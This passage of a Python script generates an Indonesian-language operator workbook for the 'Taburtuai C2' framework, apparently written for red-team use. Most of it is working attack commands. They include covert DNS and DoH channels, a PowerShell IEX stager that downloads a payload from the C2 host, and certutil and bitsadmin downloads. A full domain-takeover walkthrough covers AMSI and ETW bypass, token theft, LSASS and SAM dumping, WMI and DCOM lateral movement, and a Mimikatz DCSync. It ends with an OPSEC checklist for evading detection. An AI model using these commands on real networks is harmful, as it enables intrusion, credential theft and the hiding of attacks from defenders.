code(doc, "agents list")
step(doc, 6, "Verifikasi konteks di agent DC.")
code(doc, 'cmd <DC_AGENT_ID> "whoami" --wait')

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 16 — ADVANCED TRANSPORTS
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 16 — Advanced Transports")

body(doc, "Transport alternatif digunakan ketika HTTP/HTTPS standar diblokir atau terlalu mudah dideteksi. Setiap transport memanfaatkan protokol berbeda sebagai covert channel.")

h2(doc, "WebSocket — Latensi Rendah")

code(doc, """# Server setup
./bin/server --ws --ws-port 8081

# Build agent
make agent-win-ws \\
  C2_SERVER=http://IP:8080 \\
  ENC_KEY=Key \\
  TRANSPORT=ws

# Agent konek sekali, server push command tanpa harus tunggu beacon
# Latensi: <1 detik vs 30 detik (HTTP polling)""")

h2(doc, "DNS Authoritative")

body(doc, "Agent mengirim data via DNS TXT query ke server yang bertindak sebagai authoritative DNS server. Traffic terlihat seperti DNS lookup biasa.")

code(doc, """# Server setup (butuh domain yang dikuasai)
./bin/server \\
  --dns \\
  --dns-domain c2.yourdomain.com \\
  --dns-port 5353

# Build agent
make agent-win-dns \\
  C2_SERVER=http://IP:8080 \\
  ENC_KEY=Key \\
  TRANSPORT=dns \\
  DNS_DOMAIN=c2.yourdomain.com \\
  DNS_SERVER=<SERVER_IP>:5353""")

h2(doc, "DNS-over-HTTPS (DoH)")

code(doc, """# Tidak perlu setup server khusus
# Agent mengirim query ke Cloudflare/Google yang forward ke server C2

make agent-win-doh \\
  C2_SERVER=c2.yourdomain.com \\
  ENC_KEY=Key \\
  TRANSPORT=doh \\
  DOH_PROVIDER=cloudflare \\
  INTERVAL=120""")

h2(doc, "Certificate Pinning")

code(doc, """# Dapatkan fingerprint sertifikat server
openssl s_client -connect IP:8443 </dev/null 2>/dev/null \\
  | openssl x509 -fingerprint -sha256 -noout

# Build agent dengan pin
make agent-win-stealth \\
  C2_SERVER=https://IP:8443 \\
  ENC_KEY=Key \\
  CERT_PIN=aabbcc...(64 hex chars)""")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 17 — TEAM SERVER
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 17 — Multi-Operator Team Server (RBAC)")

body(doc, "Taburtuai C2 mendukung operasi multi-operator dengan Role-Based Access Control (RBAC). Setiap operator memiliki role berbeda dengan level akses berbeda.")

h2(doc, "Roles")

table(doc,
    ["Role", "Level", "Akses"],
    [
        ("admin",    "3 (tertinggi)", "Semua operasi, termasuk promote/demote operator lain"),
        ("operator", "2",             "Eksekusi command, inject, creds, lateral movement"),
        ("viewer",   "1",             "Hanya bisa melihat agent list dan output"),
    ],
    col_widths=[2.5, 3.5, 9.0]
)

h2(doc, "Register Operator")

code(doc, """# Server harus dijalankan dengan admin key
./bin/server --admin-key "SuperSecret2026"

# Register sebagai admin
curl -X POST http://IP:8080/api/v1/team/register \\
  -d '{"name":"alice","role":"admin","admin_key":"SuperSecret2026"}'

# Register sebagai operator (tanpa admin key)
curl -X POST http://IP:8080/api/v1/team/register \\
  -d '{"name":"bob","role":"operator"}'

# Register sebagai viewer
curl -X POST http://IP:8080/api/v1/team/register \\
  -d '{"name":"carol","role":"viewer"}'""")

h2(doc, "Team Operations")

code(doc, """# Subscribe ke SSE event stream (real-time notification)
team subscribe alice --server http://IP:8080

# List operator aktif
team operators

# Claim agent (lock agent untuk operator tertentu)
team claim <agent-id> --session <SESSION_ID>

# Release agent
team release <agent-id> --session <SESSION_ID>

# Broadcast pesan ke semua operator
team broadcast --message "Mulai fase lateral movement" --session <SESSION_ID>""")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 18 — ADVANCED TECHNIQUES
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 18 — Advanced Techniques")

h2(doc, "BOF Execution (Beacon Object Files)")

body(doc, "BOF adalah COFF object file yang dieksekusi in-process oleh agent tanpa menyentuh disk. Compatible dengan Cobalt Strike BOF yang sudah ada.")

code(doc, """# Eksekusi BOF
bof <agent-id> ./path/to/module.o --wait

# BOF dengan argumen
bof <agent-id> ./whoami.o --args-file packed_args.bin --wait

# Contoh BOF yang umum digunakan:
# - BOF Collection (trustedsec)
# - CS-Situational-Awareness-BOF
# - nanodump BOF""")

h2(doc, "Registry Operations")

code(doc, """# Baca registry value
registry read <agent-id> \\
  --hive HKLM \\
  --key "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" \\
  --value ProductName --wait

# Tulis value
registry write <agent-id> \\
  --hive HKCU \\
  --key "Software\\Test" \\
  --value MyKey --data "hello" --type sz --wait

# List subkeys
registry list <agent-id> \\
  --hive HKLM \\
  --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" --wait

# Hapus value
registry delete <agent-id> \\
  --hive HKCU \\
  --key "Software\\Test" --value MyKey --wait""")

h2(doc, "Stager & Staged Delivery")

body(doc, "Stager adalah payload kecil yang men-download dan mengeksekusi agent penuh dari server C2. Berguna untuk bypass size restriction di phishing atau exploit.")

code(doc, """# Upload stage ke server
stage upload ./bin/agent_windows_stealth.exe

# List stages
stage list

# Dapatkan delivery URL
# Format: http://IP:8080/stage/<token>

# PowerShell stager (download + exec)
staged powershell --server http://IP:8080 --token <TOKEN>

# Output PS one-liner yang bisa di-paste di target:
# IEX (New-Object Net.WebClient).DownloadString('http://IP:8080/stage/TOKEN')""")

h2(doc, "LOLBin Fetch")

body(doc, "Gunakan Windows built-in tools untuk download file — lebih stealth dari PowerShell WebClient yang sudah banyak di-monitor.")

code(doc, """# Download via certutil (paling umum)
fetch <agent-id> http://10.10.5.3/tool.exe "C:\\Temp\\tool.exe" --method certutil --wait

# Download via bitsadmin
fetch <agent-id> http://10.10.5.3/tool.exe "C:\\Temp\\tool.exe" --method bitsadmin --wait

# Download via PowerShell (fallback)
fetch <agent-id> http://10.10.5.3/tool.exe "C:\\Temp\\tool.exe" --method powershell --wait""")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 19 — END-TO-END SCENARIO
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 19 — Skenario Red Team End-to-End")

body(doc, "Skenario ini mensimulasikan engagement red team lengkap dari initial access hingga domain compromise. Ikuti setiap tahap secara berurutan.")

h2(doc, "Objective")
body(doc, "Target: Compromise domain CORP.LOCAL. Berhasil jika mendapatkan Domain Admin credentials dan dapat melakukan DCSync dari Domain Controller.")

h2(doc, "Infrastruktur")
table(doc,
    ["Host", "IP", "Role"],
    [
        ("Kali Linux / C2 Server", "10.10.5.1",    "C2 Server, Operator Machine"),
        ("DESKTOP-VICTIM",         "192.168.1.105", "Initial foothold, user john.doe"),
        ("FS01 (File Server)",     "192.168.1.50",  "Lateral target"),
        ("DC01 (Domain Controller)","192.168.1.100","Final target"),
    ],
    col_widths=[4.5, 3.0, 7.5]
)

h2(doc, "Phase 1 — Initial Access & Setup")

numbered(doc, "Deploy C2 server di mesin attacker.")
code(doc, """ENCRYPTION_KEY=EngagementKey2026 ./bin/server \\
  --tls --tls-port 8443 \\
  --auth --api-key "RedTeamOps2026" \\
  --profile office365""")

numbered(doc, "Build agent untuk initial foothold.")
code(doc, """make agent-win-stealth \\
  C2_SERVER=https://10.10.5.1:8443 \\
  ENC_KEY=EngagementKey2026 \\
  INTERVAL=30 JITTER=30 \\
  PROFILE=office365 \\
  KILL_DATE=2026-06-30""")

numbered(doc, "Delivery agent ke DESKTOP-VICTIM (via phishing, exploit, atau social engineering).")
numbered(doc, "Verifikasi agent check-in.")
code(doc, "./bin/operator console --server https://10.10.5.1:8443 --api-key RedTeamOps2026\nagents list")

h2(doc, "Phase 2 — Situational Awareness")

numbered(doc, "Basic recon dari posisi agent.")
code(doc, """cmd AGENTID "whoami /all" --wait
cmd AGENTID "systeminfo" --wait
cmd AGENTID "ipconfig /all" --wait
cmd AGENTID "net localgroup administrators" --wait""")

numbered(doc, "Scan jaringan internal.")
code(doc, """netscan AGENTID \\
  --targets 192.168.1.0/24 \\
  --ports 88,389,445,3389,5985 \\
  --wait
# → DC01: 88,389,445 open (Domain Controller)
# → FS01: 445,3389 open (File Server)""")

numbered(doc, "Screenshot untuk konteks visual.")
code(doc, "screenshot AGENTID --wait")

h2(doc, "Phase 3 — Privilege Escalation")

numbered(doc, "Bypass AMSI dan ETW.")
code(doc, "bypass amsi AGENTID --wait\nbypass etw  AGENTID --wait\nevasion unhook AGENTID --wait")

numbered(doc, "Steal SYSTEM token.")
code(doc, """token list AGENTID --wait
# Identifikasi PID lsass atau winlogon
token steal AGENTID --pid 624 --wait
cmd AGENTID "whoami" --wait
# → NT AUTHORITY\\SYSTEM""")

h2(doc, "Phase 4 — Credential Access")

numbered(doc, "Dump LSASS.")
code(doc, """creds lsass AGENTID --output "C:\\Temp\\ls.dmp" --wait
files download AGENTID "C:\\Temp\\ls.dmp" ./loot/lsass.dmp""")

numbered(doc, "Dump SAM database.")
code(doc, """creds sam AGENTID --output-dir "C:\\Temp" --wait
files download AGENTID "C:\\Temp\\SAM"    ./loot/SAM
files download AGENTID "C:\\Temp\\SYSTEM" ./loot/SYSTEM""")

numbered(doc, "Dump browser credentials.")
code(doc, "creds browser AGENTID --wait")

numbered(doc, "Parse credentials (di mesin operator).")
code(doc, """pypykatz lsa minidump ./loot/lsass.dmp
# Hasil: CORP\\john.doe:CorpMail@2026!, CORP\\administrator:Admin@Corp!""")

h2(doc, "Phase 5 — Lateral Movement ke File Server")

numbered(doc, "Lateral ke FS01 via WMI menggunakan credential administrator.")
code(doc, """lateral wmi AGENTID 192.168.1.50 \\
  "powershell -w hidden -enc <B64_STAGER>" \\
  --user administrator --domain CORP --pass 'Admin@Corp!' --wait""")

numbered(doc, "Tunggu agent baru dari FS01.")
code(doc, "agents list\n# FS01_AGENTID   FS01   CORP\\administrator   online")

numbered(doc, "Dump credential dari FS01 (mungkin ada lebih banyak DA session).")
code(doc, "creds lsass FS01_AGENTID --output \"C:\\Temp\\ls2.dmp\" --wait")

h2(doc, "Phase 6 — Domain Compromise via DCOM ke DC01")

numbered(doc, "Steal token Domain Admin dari FS01.")
code(doc, """token list FS01_AGENTID --wait
# Cari session DA di FS01
token steal FS01_AGENTID --pid <DA_PID> --wait""")

numbered(doc, "Lateral ke DC01 via DCOM (paling stealth — tidak ada service/schtask).")
code(doc, """lateral dcom FS01_AGENTID DC01 \\
  "powershell -w hidden -enc <B64_STAGER>" \\
  --method mmc20 --wait""")

numbered(doc, "Tunggu agent dari DC01.")
code(doc, "agents list\n# DC01_AGENTID   DC01   CORP\\administrator   online   ← DA!")

numbered(doc, "DCSync via Mimikatz untuk dump semua credential domain.")
code(doc, """files upload DC01_AGENTID ./mimikatz.exe "C:\\Windows\\Temp\\m.exe" --wait
cmd DC01_AGENTID \\
  "C:\\Windows\\Temp\\m.exe \\"lsadump::dcsync /domain:CORP.LOCAL /all\\" exit" \\
  --timeout 120 --wait""")

numbered(doc, "Cleanup — hapus semua artefak.")
code(doc, """cmd DC01_AGENTID "del C:\\Windows\\Temp\\m.exe" --wait
cmd DC01_AGENTID "del C:\\Temp\\*.dmp" --wait
persistence remove AGENTID --method registry_run --name "WindowsUpdate" --wait""")

add_page_break(doc)

# ═══════════════════════════════════════════════════════════════════════════════
#  SECTION 20 — OPSEC CHECKLIST
# ═══════════════════════════════════════════════════════════════════════════════

h1(doc, "Bagian 20 — OPSEC Checklist & Best Practices")

body(doc, "OPSEC (Operations Security) adalah serangkaian praktik untuk meminimalkan jejak digital yang ditinggalkan selama engagement. Gagal OPSEC bisa berarti deteksi prematur, alert incident response, dan kegagalan engagement.")

h2(doc, "Pre-Engagement Checklist")

bullet(doc, "Gunakan VPS dedicated untuk C2, bukan IP pribadi atau perusahaan.")
bullet(doc, "Aktifkan TLS dengan sertifikat valid (Let's Encrypt) — sertifikat self-signed mudah dideteksi.")
bullet(doc, "Daftarkan domain yang terlihat legitimate (brand impersonation sesuai target).")
bullet(doc, "Gunakan malleable profile yang sesuai target environment (office365 untuk korporat).")
bullet(doc, "Set KILL_DATE agar agent otomatis mati setelah engagement selesai.")
bullet(doc, "Catat semua persistence, artefak, dan akun yang dibuat untuk cleanup.")
bullet(doc, "Aktifkan API key authentication di server.")
bullet(doc, "Gunakan cert pinning di agent untuk mencegah MITM oleh blue team.")

h2(doc, "Operational Checklist")

table(doc,
    ["Fase", "Checklist Item"],
    [
        ("Initial Access",   "Hapus stager dari server setelah agent check-in"),
        ("Initial Access",   "Verifikasi tidak ada error di log server"),
        ("Post-Exploit",     "Bypass AMSI+ETW sebelum operasi lanjutan"),
        ("Post-Exploit",     "Gunakan PPID spoofing untuk semua subprocess"),
        ("Credentials",      "Delete LSASS dump dari target setelah download"),
        ("Lateral",          "Prioritaskan DCOM > WMI > WinRM (order stealth)"),
        ("Lateral",          "Hapus semua schtask/service setelah eksekusi"),
        ("Exfil",            "Enkripsi data sebelum exfiltration"),
        ("Exfil",            "Gunakan channel yang menyerupai traffic normal"),
        ("Cleanup",          "Hapus semua file yang di-upload ke target"),
        ("Cleanup",          "Hapus semua persistence (registry, schtask, service)"),
        ("Cleanup",          "Clear event log jika diperlukan (dengan izin)"),
        ("Cleanup",          "Reset semua akun yang dibuat selama engagement"),
    ],
    col_widths=[3.5, 11.5]
)

h2(doc, "Teknik Pilihan untuk OPSEC Tinggi")

table(doc,
    ["Tujuan", "Teknik Direkomendasikan", "Alasan"],
    [
        ("Process spawn",       "PPID Spoofing",              "Process tree terlihat legitimate"),
        ("AMSI bypass",         "HWBP (hardware breakpoint)", "Tidak ada patch di memory"),
        ("LSASS dump",          "lsass-wer (WER method)",     "Tidak direct LSASS access"),
        ("Lateral movement",    "DCOM/mmc20",                 "Tidak ada service/schtask artifact"),
        ("Persistence",         "Registry HKCU (user level)", "Tidak butuh admin, kecurigaan rendah"),
        ("Transport",           "HTTPS + Office365 profile",  "Traffic menyerupai Microsoft 365"),
        ("File transfer",       "Upload ke ADS",              "File tidak terlihat di Explorer"),
        ("Shellcode exec",      "DLL Stomping / Threadless",  "Tidak ada RWX memory allocation"),
    ],
    col_widths=[3.5, 4.0, 7.5]
)

h2(doc, "Indikator Kompromi (IOC) yang Harus Dihindari")

bullet(doc, "File binary agent di lokasi mencurigakan (C:\\Users\\Public, C:\\Temp)")
bullet(doc, "Koneksi keluar ke IP yang tidak biasa dari user workstation")
bullet(doc, "Process cmd.exe atau powershell.exe dengan parent yang tidak wajar")
bullet(doc, "Registry Run key dengan nama asing atau path ke temp directory")
bullet(doc, "Service baru dengan nama yang mirip tapi tidak identik dengan Windows service")
bullet(doc, "LSASS memory access dari proses non-system")
bullet(doc, "Volume DNS query yang tinggi ke domain yang baru diregistrasi")
bullet(doc, "Encoded PowerShell command (-enc) yang panjang di event log")

h2(doc, "Cleanup Procedure")

numbered(doc, "List semua agent aktif.")
code(doc, "agents list")
numbered(doc, "Untuk setiap agent, hapus semua persistence.")
code(doc, "persistence list <agent-id> --wait\npersistence remove <agent-id> --method <method> --name <name> --wait")
numbered(doc, "Hapus semua file yang di-upload.")
code(doc, 'cmd <agent-id> "del C:\\Temp\\* /Q" --wait')
numbered(doc, "Stop semua SOCKS5 proxy dan port forward aktif.")
code(doc, "socks5 stop <agent-id> --wait\nportfwd list\nportfwd stop <sess-id>")
numbered(doc, "Hapus agent dari database server.")
code(doc, "agents delete <agent-id>")
numbered(doc, "Stop server C2 dan hapus database engagement.")
code(doc, "rm data/taburtuai.db\nrm -rf logs/")

spacer(doc, 20)
hr(doc, color="C0392B", thickness=8)
spacer(doc, 8)

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("TABURTUAI C2  ·  OPERATOR WORKBOOK  ·  For Authorized Use Only")
r.font.name      = FONT_BODY
r.font.size      = Pt(9)
r.font.italic    = True
r.font.color.rgb = LGRAY

# ── Save ──────────────────────────────────────────────────────────────────────

output_path = r"d:\APPS\ICSSI\taburtuaiC2\Taburtuai_C2_Operator_Workbook.docx"
doc.save(output_path)
print(f"[+] Workbook saved: {output_path}")
print(f"    Pages (approx): 60+")
